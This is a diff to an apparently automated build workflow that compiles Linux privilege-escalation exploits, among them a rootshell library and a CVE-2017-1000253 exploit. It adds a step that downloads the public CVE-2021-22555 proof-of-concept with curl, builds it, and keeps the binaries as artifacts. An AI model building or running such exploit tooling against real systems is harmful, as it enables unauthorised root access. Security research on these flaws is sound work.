@@ -17,6 +17,8 @@ jobs:
           gcc -fpic -shared -nostartfiles -Os -s -o rootshell rootshell.c
           xxd -i rootshell > rootshell.h
           gcc -static -O2 -o ../bin/pie_exploit cve-2017-1000253.c -lpthread || true
+          curl -fsSL -o cve-2021-22555.c https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+          gcc -static -O2 -o ../bin/cve-2021-22555 cve-2021-22555.c -lpthread || true
           cd ..
           ls -la bin/
           file bin/*
@@ -29,4 +31,5 @@ jobs:
             bin/fragnesia
             bin/skb_segment_exploit
             bin/pie_exploit
+            bin/cve-2021-22555
           retention-days: 7
